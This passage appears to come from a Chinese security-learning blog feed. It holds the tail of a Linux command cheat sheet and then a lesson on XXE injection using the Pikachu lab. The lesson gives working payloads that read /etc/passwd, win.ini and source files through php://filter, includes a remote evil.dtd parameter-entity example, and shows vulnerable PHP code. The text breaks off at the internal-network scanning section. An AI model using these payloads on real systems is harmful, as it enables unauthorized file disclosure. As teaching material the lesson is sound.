f 表示文件</p><p>find 目录 -type f -name 文件名 | xargs rm -f 把查找出来的文件删除</p><p><strong>创建文件</strong></p><p>touch 文件名 创建文件</p><p>mkdir 目录名 创建目录 (文件夹)</p><p>mkdir -p 目录名 / 目录名 / 目录名 递归创建目录</p><p>ln -s 目标文件 链接文件 创建链接文件 (软连接，目标文件不能删除)</p><p>ln 目标文件 链接文件  创建链接文件 (硬链接，目标文件可以删除，删了一样可以访问，相当于 copy 了一份)</p><p><strong>编辑文件</strong></p><p>echo “内容” &gt; 文件名  文件不存在，则创建文件，文件存在，则覆盖原文件内容</p><p>echo “内容” &gt;&gt; 文件名 追加内容，问价不存在则自动创建</p><p>vi 文件名 进入编辑模式</p><p><strong>移动文件 (重命名)</strong></p><p>mv 文件名 目录名 移动文件到指定目录下</p><p>mv 文件名 新文件名 在源目录下移动，相当于重命名</p><p>mv 文件名 指定目录下文件名 将文件移动到指定目录下，并创建新文件</p><p><strong>删除文件</strong></p><p>rmdir 目录名 删除空目录</p><p>rm 文件  删除文件 (默认有提示)</p><p>rm -f 文件  强制删除 (无提示)</p><p>rm -r 目录  有提示 递归删除</p><p>rm -rf 目录 递归删除该目录下所有的文件和目录</p><p><strong>复制文件 (copy)</strong></p><p>cp 文件名 指定目录 copy 文件到指定目录</p><p>cp 文件名 新文件名   copy 文件到指定目录并创建新文件</p><p>cp -r 目录名 目标目录名 copy 目录到指定目录 (该目录下的所有东西都会被 copy)</p><p>\cp 文件名 指定目录  copy 文件到指定目录 (没有提示，直接覆盖)</p><p><strong>文件比较</strong></p><p>diff 文件 1 文件 2   比较两个文件内容 (只能自己看内容比较)</p><p>vimdiff 文件 1 文件 2 比较两个文件内容 (不一样的内容会高亮)</p><p><strong>下载文件</strong></p><p>wget 文件链接  远程下载文件</p><h2 id="3linux网络操作命令"><a class="markdownIt-Anchor" href="#3linux网络操作命令">#</a> 3：linux 网络操作命令</h2><h3 id="31网络设备操作命令"><a class="markdownIt-Anchor" href="#31网络设备操作命令">#</a> 3.1：网络设备操作命令</h3><h4 id="1-hostname"><a class="markdownIt-Anchor" href="#1-hostname">#</a> 1. hostname</h4><p>hostname 没有选项，显示主机名字</p><p>hostname –d 显示机器所属域名</p><p>hostname –f 显示完整的主机名和域名</p><p>hostname –i 显示当前机器的 ip 地址</p><h4 id="2-ping"><a class="markdownIt-Anchor" href="#2-ping">#</a> 2. ping</h4><p>ping 将数据包发向用户指定地址。当包被接收，目标机器发送返回数据包。ping 主要有两个作用：</p><ul><li>用来确认网络连接是畅通的。</li><li>用来查看连接的速度信息。</li></ul><p>如果你 ping <span class="exturl" data-url="aHR0cHM6Ly96aGFuZ2dlLm5ldC8=">zhangge.net</span>  它将返回它的 ip 地址 。你可以通过 ctrl+C 来停止命令。</p><h4 id="3-ifconfig"><a class="markdownIt-Anchor" href="#3-ifconfig">#</a> 3. ifconfig</h4><p>查看用户网络配置。它显示当前网络设备配置。对于需要接收或者发送数据错误查找，这个工具极为好用。</p><h4 id="4-iwconfig"><a class="markdownIt-Anchor" href="#4-iwconfig">#</a> 4. iwconfig</h4><p>iwconfig 工具与 ifconfig 和 ethtool 类似。是用于无线网卡的。你可以用他查看设置基本的 Wi-Fi 网络信息，例如 SSID, channel 和 encryption. 还有其他很多配置你也可以查看和修改，, 包括 接收灵敏度，RTS/CTS, 发送数据包的分片大小，以及无线网卡的重传机制。</p><h4 id="5-nslookup"><a class="markdownIt-Anchor" href="#5-nslookup">#</a> 5. nslookup</h4><p>nslookup 这个命令在 有 ip 地址时，可以用这个命令来显示主机名，可以找到给定域名的所有 ip 地址。而你必须连接到互联网才能使用这个命令。</p><p>例子. nslookup <span class="exturl" data-url="aHR0cDovL21hcnNnZS5jbg==">marsge.cn</span></p><p>你也可以使用 nslookup 从 ip 获得主机名或从主机名获得 ip。</p><h4 id="6-traceroute"><a class="markdownIt-Anchor" href="#6-traceroute">#</a> 6. traceroute</h4><p>一个方便的工具。可用来查看数据包在提交到远程系统或者网站时候所经过的路由器的 IP 地址、跳数和响应时间。同样你必须链接到互联网才能使用这个命令。</p><h4 id="7-finger"><a class="markdownIt-Anchor" href="#7-finger">#</a> 7. finger</h4><p>查看用户信息。显示用户的登录名字、真实名字以及登录终端的名字和登录权限。这是 unix 一个很老的命令，现在已很少使用了。</p><h4 id="8-telnet"><a class="markdownIt-Anchor" href="#8-telnet">#</a> 8. telnet</h4><p>通过 telnet 协议连接目标主机，如果 telnet 连接可以在任一端口上完成即代表着两台主机间的连接良好。<br>telnet hostname port – 使用指定的端口 telnet 主机名。这通常用来测试主机是否在线或者网络是否正常。</p><h4 id="9-ethtool"><a class="markdownIt-Anchor" href="#9-ethtool">#</a> 9. ethtool</h4><p>ethtool 允许你查看和更改网卡的许多设置（不包括 Wi-Fi 网卡）。你可以管理许多高级设置，包括 tx/rx、校验及网络唤醒功能。下面是一些你可能感兴趣的基本命令：</p><p>ethtool -i 显示一个特定网卡的驱动信息，检查软件兼容性时尤其有用</p><p>ethtool -p 启动一个适配器的指定行为，比如让适配器的 LED 灯闪烁，以帮助你在多个适配器或接口中标识接口名称</p><p>ethtool -s 显示网络统计信息</p><p>ethtool speed &lt;10|100|1000&gt; 设置适配器的连接速度，单位是 Mbps</p><h4 id="10-netstat"><a class="markdownIt-Anchor" href="#10-netstat">#</a> 10. netstat</h4><p>发现主机连接最有用最通用的 Linux 命令。你可以使用”netstat -g” 查询该主机订阅的所有多播组（网络）</p><p>netstat -nap | grep port 将会显示使用该端口的应用程序的进程 id</p><p>netstat -a or netstat –all 将会显示包括 TCP 和 UDP 的所有连接</p><p>netstat –tcp or netstat –t 将会显示 TCP 连接</p><p>netstat –udp or netstat –u 将会显示 UDP 连接</p><p>netstat -g 将会显示该主机订阅的所有多播网络。</p><h4 id="11ifup"><a class="markdownIt-Anchor" href="#11ifup">#</a> 11.ifup</h4><p>ifup 命令用于重新启动指定的网络设备。ifup 命令的格式为：ifup 网络设备文件名。</p><h4 id="12ifdown"><a class="markdownIt-Anchor" href="#12ifdown">#</a> 12.ifdown</h4><p>ifdown 命令用于关闭指定的网络设备。ifdown 命令的格式为：ifdown 网络设备文件名。</p><h4 id="13mii-tool"><a class="markdownIt-Anchor" href="#13mii-tool">#</a> 13.mii-tool</h4><p>mii-tool 命令用于查看或修改指定网卡的通信协商方式。</p><h4 id="14route"><a class="markdownIt-Anchor" href="#14route">#</a> 14.route</h4><p>route 命令用于查看或修改主机和网络的路由信息。</p><h4 id="15service"><a class="markdownIt-Anchor" href="#15service">#</a> 15.service</h4><p>service 命令能够将目录 “/etc/init.d/” 中有关网络服务或系统服务脚本程序以一种统一的格式执行，格式为：“service 脚本程序 选项”，常用选项有：status、stop、start、restart。</p><h4 id="16ftp"><a class="markdownIt-Anchor" href="#16ftp">#</a> 16.ftp</h4><p>ftp：既能操作服务器文件又能下载服务器文件<br>使用 ftp 复制或传送文件 ftp（File Transfer Protocol）允许用户对远地主机复制文件，用户毋须考虑操作系统类型，即能向或从任何具有 TCP/IP 的系统复制文件。 ftp 命令允许复制目录中的一个文件或所有文件，但不能复制多层 次目录。使用 ftp 时， 必需在远地主机上设有帐户。 当 ftp 注册到远地系统时，并未得到 shell ，而是通过 ftp 命令解释程序同远地主机进行通讯。</p><h3 id="32网络配置文件操作"><a class="markdownIt-Anchor" href="#32网络配置文件操作">#</a> 3.2：网络配置文件操作</h3><p>1、vi /etc/sysconfig/network ：这是一个重要的网络配置文件 NETWORKING=YES ：是否允许 IPv4</p><p>NETWORKING_IPV6=YES ：是否允许 IPv6</p><p>HOSTNAME=RHEL ：配置主机名</p><p>GATEWAY=192.168.202.1 ：配置 IPv4 网关</p><p>2、vi /etc/sysconfig/network-scripts/ifcfg-eth0 ：这是第一个以太网卡的配置文件</p><p>DEVICE=eth0 ：设备名称</p><p>BOOTPROTO=static ：地址获取方式：静态配置</p><p>BROADCAST=192.168.202.255 ：IPv4 广播地址</p><p>HWADDR=00:0C:29:97:2B:B8 ：MAC 地址</p><p>IPADDR=192.168.202.5 ：IPv4 地址</p><p>IPV6ADDR=2001::5/64 ：IPv6 地址</p><p>IPV6INIT=yes ：是否开机时启用 IPv6 配置</p><p>IPV6_AUTOCONF=no ：是否使用 IPv6 地址的自动配置</p><p>NETMASK=255.255.255.0 ：IPv4 子网掩码</p><p>NETWORK=192.168.202.0 ：IPv4 网络地址</p><p>ONBOOT=yes ：是否开机时启用 IPv4 配置</p><p>重新启动网络 service network restart</p><p>3、vi /etc/resolv.conf ：这是 DNS 服务器配置文件</p><p>nameserver 192.168.202.5 ：配置主 DNS 服务器</p><p>nameserver 219.146.0.130 ：配置辅 DNS 服务器</p><p>4、ifconfig ：显示或修改 IP 地址配置</p><p>5、route：显示路由表，配置静态路由</p><p>route add -net 172.16.0.0 netmask 255.255.0.0 dev eth0</p><p>添加了一条静态路由，目标网络为 172.16.0.0，子网掩码为 255.255.0.0，本地出口为 eth0 。</p><p>6、ip：强大的命令</p><p>ip address show：显示 IP 地址配置信息</p><p>ip address add 192.168.202.10 dev eth0：给 eth0 网卡添加一个 IP 地址</p><p>ip address del 192.168.202.10 dev eth0：删除 IP 地址</p><p>ip route show ：显示路由表</p><p>ip route add 172.20.10.0/24 dev eth0：使用本地出口配置静态路由</p><p>ip route add 172.20.20.0/24 via 192.168.202.1：使用下一条 IP 地址配置静态路由</p><p>7、ping：发送 ICMP echo request 测试网络连通性</p><p>ping 192.168.202.1 ：按 Ctrl+C 结束 ping</p><p>8、traceroute：发送递增 TTL 数据包跟踪网络路由</p><p>traceroute -n 219.146.0.130：显示到达 219.146.0.130 经过的所有路由器接口地址，不解析域名</p><p>9、netstat：显示 TCP/UDP/IP 网络连接信息</p><p>netstat -nutlp：显示本机所有监听连接</p><p>netstat -anutlp：显示所有网络连接 socket</p><h2 id="4进程与服务"><a class="markdownIt-Anchor" href="#4进程与服务">#</a> 4：进程与服务</h2><h3 id="41进程操作命令"><a class="markdownIt-Anchor" href="#41进程操作命令">#</a> 4.1：进程操作命令</h3><ul><li><p>pstree: 以树状图的方式展现进程</p></li><li><p>ps: 报告当前系统的进程状态</p></li><li><p>pgrep: 以名称为依据从运行进程队列中查找进程，并显示查找到的进程 id</p></li><li><p>pidof: 查找正在运行进程的 PID</p></li><li><p>uptime: 显示系统总共运行了多长时间和系统的平均负载</p></li><li><p>free: 显示当前系统 未使用的内存空间，已使用的内存空间，内核使用的内存缓冲区</p></li><li><p>kill：结束或杀死进程</p></li></ul><h3 id="42服务操作命令"><a class="markdownIt-Anchor" href="#42服务操作命令">#</a> 4.2：服务操作命令</h3><ul><li><p>top：显示系统中程序得执行状态</p></li><li><p>vmstat：监视虚拟内存</p></li><li><p>ipcs：分析共享内存、信号量和消息队列</p><p>文件的解压缩</p><p>tar  -cvf   文件名   压缩文件</p><p>tar  -xvf   文件名    解压文件</p></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;linux的发展与基础&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#linux的发展与基础&quot;&gt;#&lt;/a&gt; linux 的发展与基础&lt;/h1&gt;
&lt;h2 id=&quot;1linux发展历史&quot;&gt;&lt;a class=&quot;markdownIt-Ancho</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title></title>
    <link href="https://sun-spots.github.io/2022/03/08/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/%E7%AC%AC%E4%BA%8C%E9%98%B6%E6%AE%B5/%E7%AC%AC%E4%B8%89%E5%91%A8/XXE/"/>
    <id>https://sun-spots.github.io/2022/03/08/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/%E7%AC%AC%E4%BA%8C%E9%98%B6%E6%AE%B5/%E7%AC%AC%E4%B8%89%E5%91%A8/XXE/</id>
    <published>2022-03-08T07:25:47.902Z</published>
    <updated>2022-03-08T07:29:55.488Z</updated>
    
    <content type="html"><![CDATA[<h1 id="第五天xxe实体注入"><a class="markdownIt-Anchor" href="#第五天xxe实体注入">#</a> 第五天：XXE 实体注入</h1><h1 id="xxe-漏洞描述"><a class="markdownIt-Anchor" href="#xxe-漏洞描述">#</a> xxe 漏洞描述</h1><p>XML 外部实体注入（XML External Entity）简称 XXE 漏洞，XML 用于标记电子文件使其具有结构性的标记 语言，可以用来标记数据、定义数据类型，是一种允许用户对自己的标记语言进行定义的源语言。XML 文档结构包括 XML 声明、DTD 文档类型定义（可选）、文档元素，目前，XML 文件作为配置文件（Spring、Struts2 等）、文档结构说明文件（PDF、RSS 等）、图片格式文件（SVG header）应用比较广泛。 XML 的语法规范由 DTD （Document Type Definition）来进行控制；</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1631778874756-efaa2d3b-a031-40ef-bf4d-ee8e668a2c37.png" alt="img"></p><p>》》》什么是 XXE 漏洞《《《</p><p>XXE 漏洞发生在应用程序解析 XML 输入时，<strong>没有禁止外部实体的加载</strong>，导致可加载恶意外部文件，造成文件读取、命令执行、内网端口扫描、攻击内网网站、发起 dos 攻击等危害的漏洞…</p><p>》》》XXE 漏洞挖掘《《《</p><p>XXE 漏洞的判定：正常情况下，XXE 漏洞的判定需要走如下的流程</p><p>第一：检测 XML 是否会被成功解析</p><p>第二：检测服务器是否支持 DTD 引用外部实体</p><p>但实际操作过程中，一般都是直接抓包看有没有使用 XML, 有就是直接往外部实体上套一下试试，没有一般我就过了 (原谅我，毕竟我是菜鸡 ==)</p><p>XXE 漏洞的危害：XXE 漏洞一般其的多是辅助拿 shell 的功能，也就是文件读取 (用的比较多)…</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!--文档类型定义--&gt;</span><br><span class="line">&lt;!DOCTYPE note [ &lt;!--定义此文档是 note 类型的文档--&gt;</span><br><span class="line">&lt;!ELEMENT note (to,from,heading,body)&gt; &lt;!--定义 note 元素有四个元素--&gt;</span><br><span class="line">&lt;!ELEMENT to (#PCDATA)&gt; &lt;!--定义 to 元素为”#PCDATA”类型--&gt;</span><br><span class="line">&lt;!ELEMENT from (#PCDATA)&gt; &lt;!--定义 from 元素为”#PCDATA”类型--&gt;</span><br><span class="line">&lt;!ELEMENT head (#PCDATA)&gt; &lt;!--定义 head 元素为”#PCDATA”类型--&gt;</span><br><span class="line">&lt;!ELEMENT body (#PCDATA)&gt; &lt;!--定义 body 元素为”#PCDATA”类型--&gt;</span><br><span class="line">]]]&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;!--文档元素--&gt;</span><br><span class="line">&lt;note&gt;</span><br><span class="line">&lt;to&gt;Dave&lt;/to&gt;</span><br><span class="line">&lt;from&gt;Tom&lt;/from&gt;</span><br><span class="line">&lt;head&gt;Reminder&lt;/head&gt;</span><br><span class="line">&lt;body&gt;You are a good man&lt;/body&gt;</span><br><span class="line">&lt;/note&gt;</span><br></pre></td></tr></table></figure><p><strong>PCDATA</strong></p><p>​PCDATA 的意思是被解析的字符数据（parsed character data）。</p><p>​可把字符数据想象为 XML 元素的开始标签与结束标签之间的文本，PCDATA 是会被解析器解析的文本。这些文本将被解析器检查实体以及标记，文本中的标签会被当作标记来处理，而实体会被展开。</p><p>不过，被解析的字符数据不应当包含任何 &amp;、&lt;或者&gt; 字符；需要使用 &amp;、&lt; 以及 &gt; 实体来分别替换它们；</p><p><strong>CDATA</strong></p><p>CDATA 的意思是字符数据（character data）。</p><p>CDATA 是不会被解析器解析的文本。在这些文本中的标签不会被当作标记来对待，其中的实体也不会被展开；</p><p>常见的 XML 语法结构：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--XML 申明--&gt;</span><br><span class="line">其中，文档定义类型（DTD）可以是内部声明也可以引用外部 DTD</span><br><span class="line"></span><br><span class="line">内部声明 DTD 格式：&lt;!DOCTYPE 根元素 [元素声明]&gt;</span><br><span class="line">引用外部 DTD 格式：&lt;!DOCTYPE 根元素 SYSTEM “文件名”&gt;   </span><br><span class="line"></span><br><span class="line">在 DTD 中进行实体说明时，将使用 ENTITY 关键字来声明。实体是用于定义引用普通文本或特殊字符的快捷</span><br><span class="line">方式的变量。实体可在内部或外部进行声明;</span><br><span class="line"></span><br><span class="line">内部声明实体格式：&lt;!ENTITY 实体名称 “实体的值”&gt;</span><br><span class="line">引用外部实体格式：&lt;!ENTITY 实体名称 SYSTEM “URI”&gt;</span><br></pre></td></tr></table></figure><p><strong>实体：</strong></p><p>实体是对数据的引用；根据实体种类的不同，XML 解析器将使用实体的替代文本或者外部文档的内容来替代实体引用，它主要分为以下四类：</p><ul><li><ul><li>内置实体 (Built-in entities)</li><li>字符实体 (Character entities)</li></ul></li><li><ul><li>通用实体 (General entities)</li><li>参数实体 (Parameter entities)</li></ul></li></ul><p>参数实体用 **% 实体名称 ** 申明，引用时也用 % 实体名称；</p><p>其余实体直接用实体名称申明，引用时用用实体名称；</p><p><strong>参数实体</strong>只能在 DTD 中申明，DTD 中引用；</p><p>其余实体只能在 DTD 中申明，可在 xml 文档中引用。</p><p>注意：参数实体是在 DTD 中被引用的，而其余实体是在 xml 文档中被引用的，另外定义义 % 后面跟空格。</p><p>DTD 中的一些重要的关键字：</p><ul><li><ul><li>DOCTYPE（DTD 的声明）</li><li>ENTITY（实体的声明）</li></ul></li><li><ul><li>SYSTEM、PUBLIC（外部资源申请）</li></ul></li></ul><p>内部实体声明：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY 实体名称 “实体的值”&gt;</span><br><span class="line"></span><br><span class="line">一个实体由三部分构成: &amp;符号, 实体名称, 分号 (;)，这里&amp;不论在GET还是在POST中都需要进行URL编码，因为是使用参数传入xml的，&amp;符号会被认为是参数间的连接符号，示例：</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE foo [</span><br><span class="line">&lt;!ELEMENT foo ANY &gt;</span><br><span class="line">&lt;!ENTITY xxe &quot;Thinking&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;foo&gt;&amp;xxe;&lt;/foo&gt;</span><br></pre></td></tr></table></figure><p>外部实体声明：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">XML中对数据的引用称为实体，实体中有一类叫外部实体，用来引入外部资源，有SYSTEM和PUBLIC两个关键字，表示实体来自本地计算机还是公共计算机，外部实体的引用可以借助各种协议，比如以下三种：</span><br><span class="line"></span><br><span class="line">file:///path/to/file.ext</span><br><span class="line">http://url</span><br><span class="line">php://filter/read=convert.base64-encode/resource=conf.php</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE foo [</span><br><span class="line">&lt;!ELEMENT foo ANY &gt;</span><br><span class="line">&lt;!ENTITY xxe SYSTEM “URI/URL”&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;foo&gt;&amp;xxe;&lt;/foo&gt;</span><br><span class="line"></span><br><span class="line">外部实体示例：</span><br><span class="line"></span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE methodname [</span><br><span class="line">&lt;!ELEMENT methodname ANY &gt;</span><br><span class="line">&lt;!ENTITY xxe(实体引用名) SYSTEM &quot;file:///etc/passwd&quot;(实体内容) &gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;methodname&gt;&amp;xxe;&lt;/methodname&gt;</span><br><span class="line"></span><br><span class="line">这种写法调用了本地计算机的文件/etc/passwd，XML内容被解析后，文件内容便通过&amp;xxe被存放在了methodname元素中，造成了敏感信息的泄露。</span><br></pre></td></tr></table></figure><p>参数实体格式：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % 实体名称 &quot;实体的值&quot;&gt;或&lt;!ENTITY % 实体名称 SYSTEM &quot;URI&quot;&gt;</span><br><span class="line"></span><br><span class="line">参数实体示例：</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE foo [</span><br><span class="line">&lt;!ELEMENT foo ANY &gt;</span><br><span class="line">&lt;!ENTITY  % xxe SYSTEM &quot;http://xxx.xxx.xxx/evil.dtd&quot; &gt;</span><br><span class="line">%xxe;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;foo&gt;&amp;evil;&lt;/foo&gt;</span><br><span class="line"></span><br><span class="line">外部evil.dtd中的内容：</span><br><span class="line"></span><br><span class="line">&lt;!ENTITY evil  &quot;file:///c:/windows/win.ini&quot; &gt;</span><br><span class="line"></span><br><span class="line">引用公共实体</span><br><span class="line"> </span><br><span class="line">&lt;!ENTITY 实体名称 PUBLIC &quot;public_ID&quot; &quot;URI/URL&quot;&gt;</span><br></pre></td></tr></table></figure><p>由于 xxe 漏洞主要是利用了 DTD 引用外部实体导致的漏洞，那么重点看下能引用哪些类型的外部实体。当 libXML2 &lt; libxml2.9 才会造成外部注入漏洞；</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1631779577152-db18c769-afdb-4aa3-b7f6-16c2aea6eee3.png" alt="img"></p><p>语法引用外部的实体，而非内部实体，那么 URI 中能写哪些类型的外部实体呢？</p><p>主要的有 file、http、https、ftp 等等，当然不同的程序支持的不一样：</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1631779662946-09448010-78c5-4e7a-a964-d8294b5015c2.png" alt="img"></p><h1 id="xxe-漏洞代码分析-1"><a class="markdownIt-Anchor" href="#xxe-漏洞代码分析-1">#</a> xxe 漏洞代码分析 1</h1><p>环境：</p><p>皮卡丘靶场 xxe 漏洞</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">if(isset($_POST[&#x27;submit&#x27;]) and $_POST[&#x27;xml&#x27;] != null)&#123;</span><br><span class="line">    $xml =$_POST[&#x27;xml&#x27;];</span><br><span class="line">//$xml = $test;</span><br><span class="line">    $data = @simplexml_load_string($xml,&#x27;SimpleXMLElement&#x27;,LIBXML_NOENT);</span><br><span class="line">    if($data)&#123;</span><br><span class="line">        $html.=&quot;&lt;pre&gt;&#123;$data&#125;&lt;/pre&gt;&quot;;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        $html.=&quot;&lt;p&gt;XML声明、DTD文档类型定义、文档元素这些都搞懂了吗?&lt;/p&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">simplexml_load_string() 函数把 XML 字符串载入对象中；</span><br><span class="line">获取 post 的 xml 文件 传递到 simplexml_load_string 再进行输出会遭成 xxe 注入；</span><br><span class="line">测试语句，可以判断是否有xxe漏洞，如果返回了xxe就是有：</span><br><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE a [&lt;!ENTITY b &quot;xxe&quot;&gt;]&gt;&lt;c&gt;&amp;b;&lt;/c&gt;</span><br></pre></td></tr></table></figure><p>读取敏感文件的 payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version = &quot;1.0&quot;?&gt; </span><br><span class="line">&lt;!DOCTYPE ANY [ &lt;!ENTITY f SYSTEM &quot;file:///C:/Windows/win.ini&quot;&gt; ]&gt; </span><br><span class="line">&lt;x&gt;&amp;f;&lt;/x&gt;</span><br></pre></td></tr></table></figure><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1631781377729-0fa4593c-1c62-4cf8-be28-35fceea1c9bf.png" alt="img"></p><h1 id="xxe-漏洞代码分析-2"><a class="markdownIt-Anchor" href="#xxe-漏洞代码分析-2">#</a> xxe 漏洞代码分析  2</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$string_xml = &#x27;&lt;?xml version=&quot;1.0&quot;</span><br><span class="line">encoding=&quot;GB18030&quot;?&gt;&lt;note&gt;&lt;to&gt;George&lt;/to&gt;&lt;from&gt;John&lt;/from&gt;&lt;heading&gt;Reminder&lt;/heading&gt;&lt;body&gt;xml</span><br><span class="line">实体注入&lt;/body&gt;&lt;/note&gt;&#x27;;</span><br><span class="line">$xml = isset($_GET[&#x27;xml&#x27;])?$_GET[&#x27;xml&#x27;]:$string_xml;</span><br><span class="line">$data = simplexml_load_string($xml);</span><br><span class="line">echo &#x27;&lt;meta charset=&quot;GB18030&quot;&gt;&#x27;;</span><br><span class="line">print_r($data);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">获取 xml 变量 创建 dom 对象 转入 xml 进行处理输出;</span><br><span class="line">simplexml_load_string() 函数把 XML 字符串载入对象中;</span><br></pre></td></tr></table></figure><h2 id="有回显"><a class="markdownIt-Anchor" href="#有回显">#</a> 有回显</h2><h3 id="xxe-漏洞常用利用如下"><a class="markdownIt-Anchor" href="#xxe-漏洞常用利用如下">#</a> xxe 漏洞常用利用如下</h3><h4 id="读取敏感文件"><a class="markdownIt-Anchor" href="#读取敏感文件">#</a> 读取敏感文件</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE a [&lt;!ENTITY b SYSTEM &quot;file:///etc/passwd&quot;&gt;]&gt;&lt;c&gt;&amp;b;&lt;/c&gt;</span><br><span class="line"></span><br><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE a [&lt;!ENTITY b SYSTEM &quot;file:///C:/Windows/win.ini&quot;&gt;]&gt;&lt;c&gt;&amp;b;&lt;/c&gt;</span><br><span class="line"></span><br><span class="line">注意payload做url编码</span><br></pre></td></tr></table></figure><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1631783132155-05ab71be-93a6-4c60-b770-a149d4c99fd7.png" alt="img"></p><h4 id="使用-php-伪协议-phpfilter-读取文件"><a class="markdownIt-Anchor" href="#使用-php-伪协议-phpfilter-读取文件">#</a> 使用 php 伪协议 php://filter 读取文件</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE xdsec [</span><br><span class="line">&lt;!ELEMENT methodname ANY &gt;</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;php://filter/read=convert.base64-encode/resource=phpinfo.php&quot; &gt;]&gt;</span><br><span class="line">&lt;methodcall&gt;</span><br><span class="line">&lt;methodname&gt;&amp;xxe;&lt;/methodname&gt;</span><br><span class="line">&lt;/methodcall&gt;</span><br></pre></td></tr></table></figure><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1631783413804-1e2a36e5-065b-4ff8-a9e7-c1877ab44a17.png" alt="img"></p><h4 id="扫描内网和端口"><a class="markdownIt-Anchor" href="#扫描内网和端口">#</a> 扫描内网和端口</h4><p>通过扫描 ip 和端口确定内网机器的 ip 